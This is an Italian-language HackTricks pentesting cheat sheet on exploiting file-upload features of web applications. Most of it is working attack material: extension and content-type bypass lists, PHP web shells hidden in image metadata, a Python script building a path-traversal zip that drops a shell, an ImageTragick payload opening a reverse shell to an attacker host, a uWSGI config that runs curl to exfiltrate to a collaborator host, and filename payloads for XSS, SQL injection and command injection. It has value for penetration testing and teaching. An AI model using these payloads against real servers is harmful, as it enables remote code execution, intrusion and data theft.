# Caricamento di file

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per **bug bounty creata da hacker, per hacker**! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare taglie fino a **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Metodologia generale per il caricamento di file

Altre estensioni utili:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Lavorando in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Eludere i controlli sulle estensioni dei file

1. Se si applicano, **controllare** le **estensioni precedenti**. Provarle anche utilizzando alcune **lettere maiuscole**: _pHp, .pHP5, .PhAr ..._
2. _Controllare **aggiungendo un'estensione valida prima** dell'estensione di esecuzione (utilizzare anche le estensioni precedenti):_
* _file.png.php_
* _file.png.Php5_
3. Provare ad aggiungere **caratteri speciali alla fine**. √à possibile utilizzare Burp per **forzare** tutti i caratteri **ascii** e **Unicode**. (_Nota che √® possibile provare anche a utilizzare le **estensioni precedentemente** menzionate_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Provare a eludere le protezioni **ingannando il parser delle estensioni** lato server con tecniche come **raddoppiare** l'estensione o **aggiungere dati spazzatura** (byte null) tra le estensioni. _√à possibile utilizzare anche le **estensioni precedenti** per preparare un payload migliore._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Aggiungere **un altro livello di estensioni** al controllo precedente:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. Provare a mettere l'estensione di esecuzione **prima dell'estensione valida** e sperare che il server sia configurato in modo errato. (utile per sfruttare le configurazioni errate di Apache in cui qualsiasi cosa con estensione **.php**, ma **non necessariamente terminante in .php**, eseguir√† il codice):
* _es: file.php.png_
7. Utilizzare **NTFS alternate data stream (ADS)** in **Windows**. In questo caso, verr√† inserito un carattere due punti ":" dopo un'estensione vietata e prima di una consentita. Di conseguenza, verr√† creato un **file vuoto con l'estensione vietata** sul server (ad esempio, "file.asax:.jpg"). Questo file potrebbe essere modificato successivamente utilizzando altre tecniche come l'utilizzo del suo nome breve. Il pattern "**::$data**" pu√≤ anche essere utilizzato per creare file non vuoti. Pertanto, aggiungere un carattere punto dopo questo pattern potrebbe essere utile per eludere ulteriori restrizioni (ad esempio, "file.asp::$data.")
8. Provare a superare i limiti del nome del file. L'estensione valida viene tagliata. E il PHP dannoso viene lasciato. AAA<--SNIP-->AAA.php

```
# Linux massimo 255 byte
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # meno 4 qui e aggiungere .png
# Caricare il file e controllare la risposta per vedere quanti caratteri permette. Diciamo 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Creare il payload
AAA<--SNIP 232 A-->AAA.php.png
```
### Bypass Content-Type, Magic Number, Compression & Resizing

* Bypassa i controlli del **Content-Type** impostando il **valore** dell'**header Content-Type** a: _image/png_, _text/plain_, application/octet-stream_
1. Wordlist per il Content-Type: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Bypassa il controllo del **magic number** aggiungendo all'inizio del file i **byte di un'immagine reale** (confondere il comando _file_). Oppure inserisci la shell all'interno dei **metadati**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` oppure puoi anche **inserire direttamente il payload** in un'immagine:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Se viene aggiunta **compressione all'immagine**, ad esempio utilizzando alcune librerie PHP standard come [PHP-GD](https://www.php.net/manual/fr/book.image.php), le tecniche precedenti non saranno utili. Tuttavia, puoi utilizzare la **chunk PLTE** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviver√† alla compressione**.
* [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* La pagina web potrebbe anche **ridimensionare** l'**immagine**, utilizzando ad esempio le funzioni PHP-GD `imagecopyresized` o `imagecopyresampled`. Tuttavia, puoi utilizzare la **chunk IDAT** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviver√† alla compressione**.
* [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Un'altra tecnica per creare un payload che **sopravvive al ridimensionamento di un'immagine**, utilizzando la funzione PHP-GD `thumbnailImage`. Tuttavia, puoi utilizzare la **chunk tEXt** [**tecnica definita qui**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) per inserire del testo che **sopravviver√† alla compressione**.
* [**Github con il codice**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Altri trucchi da verificare

* Trova una vulnerabilit√† per **rinominare** il file gi√† caricato (per cambiare l'estensione).
* Trova una vulnerabilit√† di **Local File Inclusion** per eseguire il backdoor.
* **Possibile divulgazione di informazioni**:
1. Carica **diverse volte** (e allo **stesso tempo**) lo **stesso file** con lo **stesso nome**
2. Carica un file con il **nome** di un **file** o **cartella** che **esiste gi√†**
3. Caricamento di un file con **‚Äú.‚Äù, ‚Äú..‚Äù, o ‚Äú‚Ä¶‚Äù come nome**. Ad esempio, in Apache in **Windows**, se l'applicazione salva i file caricati nella directory ‚Äú/www/uploads/‚Äù, il nome del file ‚Äú.‚Äù creer√† un file chiamato ‚Äúuploads‚Äù nella directory ‚Äú/www/‚Äù.
4. Carica un file che potrebbe non essere eliminato facilmente come **‚Äú‚Ä¶:.jpg‚Äù** in **NTFS**. (Windows)
5. Carica un file in **Windows** con caratteri **non validi** come `|<>*?‚Äù` nel suo nome. (Windows)
6. Carica un file in **Windows** utilizzando **nomi riservati** (**vietati**) come CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 e LPT9.
* Prova anche a **caricare un file eseguibile** (.exe) o un **.html** (meno sospetto) che **eseguir√† del codice** quando viene aperto accidentalmente dalla vittima.

### Trucchi speciali per le estensioni

Se stai cercando di caricare file su un server **PHP**, [dai un'occhiata al trucco del file **.htaccess** per eseguire il codice](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Se stai cercando di caricare file su un server **ASP**, [dai un'occhiata al trucco del file **.config** per eseguire il codice](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

I file `.phar` sono come i file `.jar` per Java, ma per PHP, e possono essere **utilizzati come file PHP** (eseguendoli con PHP o includendoli all'interno di uno script...)

L'estensione `.inc` viene talvolta utilizzata per i file PHP che vengono utilizzati solo per **importare file**, quindi, ad un certo punto, qualcuno potrebbe aver permesso **l'esecuzione di questa estensione**.

## **Jetty RCE**

Se puoi caricare un file XML su un server Jetty, puoi ottenere [RCE perch√© **i nuovi \*.xml e \*.war vengono elaborati automaticamente**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Quindi, come indicato nell'immagine seguente, carica il file XML in `$JETTY_BASE/webapps/` e aspetta la shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Per una dettagliata esplorazione di questa vulnerabilit√†, consulta la ricerca originale: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Le vulnerabilit√† di Remote Command Execution (RCE) possono essere sfruttate nei server uWSGI se si ha la possibilit√† di modificare il file di configurazione `.ini`. I file di configurazione uWSGI utilizzano una specifica sintassi per incorporare variabili "magiche", segnaposto e operatori. In particolare, l'operatore '@', utilizzato come `@(nomefile)`, √® progettato per includere il contenuto di un file. Tra i vari schemi supportati in uWSGI, lo schema "exec" √® particolarmente potente, consentendo la lettura dei dati dall'output standard di un processo. Questa funzionalit√† pu√≤ essere manipolata per scopi malintenzionati come Remote Command Execution o Arbitrary File Write/Read quando viene elaborato un file di configurazione `.ini`.

Considera il seguente esempio di un file `uwsgi.ini` dannoso, che mostra vari schemi:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'esecuzione del payload avviene durante l'analisi del file di configurazione. Per attivare e analizzare la configurazione, il processo uWSGI deve essere riavviato (potenzialmente dopo un crash o a causa di un attacco di Denial of Service) o il file deve essere impostato per il ricaricamento automatico. La funzione di ricaricamento automatico, se abilitata, ricarica il file a intervalli specificati quando vengono rilevate modifiche.

√à fondamentale comprendere la natura poco rigorosa dell'analisi del file di configurazione di uWSGI. In particolare, il payload discusso pu√≤ essere inserito in un file binario (come un'immagine o un PDF), ampliando ulteriormente la portata delle possibili vulnerabilit√†.

## **Trucco di caricamento file/SSRF con wget**

In alcune occasioni potresti scoprire che un server utilizza **`wget`** per **scaricare file** e puoi **indicare** l'**URL**. In questi casi, il codice potrebbe controllare che l'estensione dei file scaricati sia all'interno di una whitelist per assicurarsi che vengano scaricati solo file consentiti. Tuttavia, **questo controllo pu√≤ essere bypassato**.\
La **lunghezza massima** di un **nome file** in **Linux** √® **255**, tuttavia, **wget** tronca i nomi file a **236** caratteri. Puoi **scaricare un file chiamato "A"\*232+".php"+".gif"**, questo nome file **bypassa** il **controllo** (come in questo esempio **".gif"** √® un'estensione **valida**) ma `wget` rinominer√† il file in **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Nota che **un'altra opzione** a cui potresti pensare per eludere questo controllo √® fare in modo che il **server HTTP reindirizzi a un file diverso**, in modo che l'URL iniziale eluda il controllo e poi wget scaricher√† il file reindirizzato con il nuovo nome. Questo **non funzioner√†** **a meno che** wget venga utilizzato con il **parametro** `--trust-server-names` perch√© **wget scaricher√† la pagina reindirizzata con il nome del file indicato nell'URL originale**.


## Strumenti

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) √® un potente strumento progettato per assistere Pentester e Bug Hunter nel testare i meccanismi di caricamento dei file. Sfrutta varie tecniche di bug bounty per semplificare il processo di identificazione e sfruttamento delle vulnerabilit√†, garantendo una valutazione approfondita delle applicazioni web.

## Dal caricamento del file ad altre vulnerabilit√†

* Imposta **il nome del file** su `../../../tmp/lol.png` e cerca di ottenere una **traversa del percorso**
* Imposta **il nome del file** su `sleep(10)-- -.jpg` e potresti essere in grado di ottenere un'**iniezione SQL**
* Imposta **il nome del file** su `<svg onload=alert(document.domain)>` per ottenere un XSS
* Imposta **il nome del file** su `; sleep 10;` per testare un'iniezione di comandi (ulteriori [trucchi per le iniezioni di comandi qui](../command-injection.md))
* [**XSS** nel caricamento di file (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* Caricamento di file **JS** + **XSS** = [sfruttamento di **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE nel caricamento di svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** tramite caricamento di file svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Prova **payload svg diversi** da [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Famosa vulnerabilit√† di **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Se puoi **indicare al server web di recuperare un'immagine da un URL**, potresti provare a sfruttare un [SSRF](../ssrf-server-side-request-forgery/). Se questa **immagine** verr√† **salvata** in un sito **pubblico**, potresti anche indicare un URL da [https://iplogger.org/invisible/](https://iplogger.org/invisible/) e **rubare le informazioni di ogni visitatore**.
* [Bypass di **XXE e CORS** con il caricamento di PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDF appositamente creati per XSS: La [pagina seguente mostra come **iniettare dati PDF per ottenere l'esecuzione di JS**](../xss-cross-site-scripting/pdf-injection.md). Se puoi caricare PDF, puoi preparare un PDF che eseguir√† JS arbitrario seguendo le indicazioni fornite.
* Carica il contenuto del \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) per verificare se il server ha un **antivirus**
* Verifica se ci sono **limiti di dimensione** per il caricamento dei file

Ecco una lista dei primi 10 risultati che puoi ottenere caricando (da [qui](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: Iniezione CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : Iniezione HTML / XSS / Reindirizzamento aperto
8. **PNG / JPEG**: Attacco di flood dei pixel (DoS)
9. **ZIP**: RCE tramite LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Estensione di Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magic Header Bytes

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Fai riferimento a [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) per altri tipi di file.

### Caricamento automatico di file Zip/Tar decompressi

Se puoi caricare un file ZIP che verr√† decompresso all'interno del server, puoi fare 2 cose:

#### Symlink

Carica un collegamento contenente collegamenti simbolici ad altri file, quindi, accedendo ai file decompressi, accederai ai file collegati:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Decomprimere in diverse cartelle

La creazione imprevista di file nelle directory durante la decompressione √® un problema significativo. Nonostante le ipotesi iniziali che questa configurazione potesse proteggere dall'esecuzione di comandi a livello di sistema operativo tramite caricamenti di file maligni, il supporto alla compressione gerarchica e le capacit√† di attraversamento delle directory del formato di archivio ZIP possono essere sfruttate. Ci√≤ consente agli attaccanti di eludere le restrizioni e di sfuggire alle directory di caricamento sicure manipolando la funzionalit√† di decompressione dell'applicazione presa di mira.

Un exploit automatizzato per creare tali file √® disponibile su [**evilarc su GitHub**](https://github.com/ptoomey3/evilarc). L'utilit√† pu√≤ essere utilizzata come mostrato:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Inoltre, l'**inganno del symlink con evilarc** √® un'opzione. Se l'obiettivo √® quello di prendere di mira un file come `/flag.txt`, dovrebbe essere creato un symlink a quel file nel tuo sistema. Ci√≤ assicura che evilarc non incontri errori durante la sua operazione.

Di seguito √® riportato un esempio di codice Python utilizzato per creare un file zip maligno:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Sfruttare la compressione per la spruzzatura di file**

Per ulteriori dettagli **controlla il post originale su**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **Creazione di una Shell PHP**:
Il codice PHP √® scritto per eseguire comandi passati tramite la variabile `$_REQUEST`.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Spruzzatura di file e creazione di un file compresso**:
Vengono creati pi√π file e viene assemblato un archivio zip contenente questi file.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Modifica con un editor esadecimale o vi**:
I nomi dei file all'interno dello zip vengono modificati utilizzando vi o un editor esadecimale, cambiando "xxA" in "../" per attraversare le directory.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Carica questo contenuto con un'estensione di immagine per sfruttare la vulnerabilit√† **(ImageMagick, 7.0.1-1)**
(dall'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Incorporazione di una shell PHP in un file PNG

Incorporare una shell PHP nel chunk IDAT di un file PNG pu√≤ bypassare efficacemente determinate operazioni di elaborazione delle immagini. Le funzioni `imagecopyresized` e `imagecopyresampled` di PHP-GD sono particolarmente rilevanti in questo contesto, in quanto vengono comunemente utilizzate per ridimensionare e campionare le immagini, rispettivamente. La capacit√† della shell PHP incorporata di rimanere indenne da queste operazioni √® un vantaggio significativo per determinati casi d'uso.

Una dettagliata esplorazione di questa tecnica, compresa la sua metodologia e le possibili applicazioni, √® fornita nell'articolo seguente: ["Codifica di web shell nei chunk IDAT di un file PNG"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Questa risorsa offre una comprensione completa del processo e delle sue implicazioni.

Ulteriori informazioni su: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## File poliglotti

I file poliglotti fungono da strumento unico nella sicurezza informatica, agendo come camaleonti che possono esistere validamente in pi√π formati di file contemporaneamente. Un esempio intrigante √® un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un ibrido che funziona sia come GIF che come archivio RAR. Tali file non si limitano a questa combinazione; sono possibili anche combinazioni come GIF e JS o PPT e JS.

L'utilit√† principale dei file poliglotti risiede nella loro capacit√† di eludere le misure di sicurezza che filtrano i file in base al tipo. La pratica comune in varie applicazioni prevede di consentire solo determinati tipi di file per l'upload, come JPEG, GIF o DOC, al fine di mitigare il rischio rappresentato da formati potenzialmente dannosi (ad esempio, file JS, PHP o Phar). Tuttavia, un poliglotta, conformandosi ai criteri strutturali di pi√π tipi di file, pu√≤ eludere stealthily queste restrizioni.

Nonostante la loro adattabilit√†, i poliglotti incontrano delle limitazioni. Ad esempio, mentre un poliglotta potrebbe incarnare contemporaneamente un file PHAR (PHp ARchive) e un JPEG, il successo del suo upload potrebbe dipendere dalle politiche di estensione dei file della piattaforma. Se il sistema √® rigoroso riguardo alle estensioni consentite, la semplice dualit√† strutturale di un poliglotta potrebbe non essere sufficiente a garantirne l'upload.

Ulteriori informazioni su: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Riferimenti

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Suggerimento per bug bounty**: **iscriviti** a **Intigriti**, una piattaforma premium per bug bounty creata da hacker, per hacker! Unisciti a noi su [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) oggi stesso e inizia a guadagnare ricompense fino a **$100.000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
